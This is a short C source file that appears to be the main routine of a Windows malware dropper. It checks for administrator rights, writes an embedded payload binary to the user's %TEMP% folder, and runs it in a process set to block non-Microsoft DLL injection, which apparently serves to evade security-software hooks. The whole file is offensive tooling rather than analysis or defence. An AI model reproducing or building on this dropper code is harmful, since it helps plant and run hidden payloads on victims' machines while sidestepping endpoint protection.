#include "../../include/core/payload.h"
#include "../../include/utils/dropper.h"
#include "../../include/utils/system.h"
#include "../../include/utils/thread.h"

int main(void) {
  print_banner();

  // Elevation check — warn but do not abort; most stages work without admin
  elevation_status_t elev = is_elevated();
  if (elev == ELEVATION_ELEVATED) {
    pretty_print(LOG_SUCCESS, "Running as Administrator");
  } else if (elev == ELEVATION_NOT_ELEVATED) {
    pretty_print(LOG_WARNING, "Not elevated — some operations may fail");
  } else {
    pretty_print(LOG_ERROR, "Could not determine elevation status");
    return 1;
  }

  // Resolve drop path under %TEMP%
  char drop_path[MAX_PATH];
  if (resolve_temp_path(PAYLOAD_FILENAME, drop_path, sizeof(drop_path)) != 0)
    return 1;

  // Write payload to disk
  if (drop_binary(drop_path, PAYLOAD_DATA, PAYLOAD_SIZE) != 0)
    return 1;

  // Launch payload in a hardened process (blocks non-Microsoft DLL injection)
  DWORD slot;
  if (spawn_binary_hardened(drop_path, NULL, &slot) != 0)
    return 1;

  thread_wait(slot, 5000);
  thread_cleanup();

  return 0;
}
